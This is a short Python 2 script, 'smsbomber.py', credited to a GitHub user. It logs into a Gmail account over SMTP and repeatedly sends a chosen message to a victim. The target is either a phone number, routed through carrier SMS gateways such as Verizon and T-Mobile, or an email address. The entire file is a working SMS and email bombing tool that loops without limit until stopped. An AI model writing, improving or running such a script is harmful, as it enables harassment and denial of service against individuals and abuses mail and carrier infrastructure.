# Name: smsbomber.py
# Made by cxdy on Github


import smtplib as s
import getpass

print"Cody's SMS/Email Bomber \n\r"
print"Please login with your Gmail account \n\r"

username = raw_input("Gmail Username (user@gmail.com): ")
password = getpass.getpass(prompt='Gmail Password: ')

obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(username, password)
print"\n\r"

print """ What kind of bomb would you like to send?

1. SMS
2. Email

"""
option = input()
print("\n\r")
if option == 1:
    carrier_attack = 0
    print """ What is their carrier? Respond with the corresponding number
	1. Alltel
	2. AT&T
	3. Rogers
	4. Sprint
	5. T-Mobile
	6. Telus
	7. Verizon
	8. Virgin Mobile
	9. Orange
"""
    carrier = input()

    if carrier == 1:
	carrier_attack = "@alltelmessage.com"
    if carrier == 2:
	carrier_attack = "@txt.att.net"
    if carrier == 3:
	carrier_attack = "@pcs.rogers.com"
    if carrier == 4:
	carrier_attack = "@messaging.sprintpcs.com"
    if carrier == 5:
	carrier_attack = "@tmomail.net"
    if carrier == 6:
	carrier_attack = "@msg.telus.com"
    if carrier == 7:
	carrier_attack = "@vtext.com"
    if carrier == 8:
	carrier_attack = "@vmobl.com"
    if carrier == 9:
	carrier_attack = "@sms.orange.pl"

    v_phone = raw_input("Phone Number: ") + str(carrier_attack)
    message = raw_input("Message: ")
    phone_message = ("From: %s\r\nTo: %s \r\n\r\n %s"
       % (username, "" .join(v_phone), "" .join(message)))

    while 1:
        obj.sendmail(username, v_phone, phone_message)
	print "Message sent! Sending another.. Press Ctrl + C to stop."

if option == 2:
    v_email = raw_input("Email: ")
    message = raw_input("Message: ")
    email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
       % (username, "" .join(v_email), "" .join(message)))

    while 1:
        obj.sendmail(username, v_email, email_message)
	print "Message sent! Sending another.. Press Ctrl + C to stop."
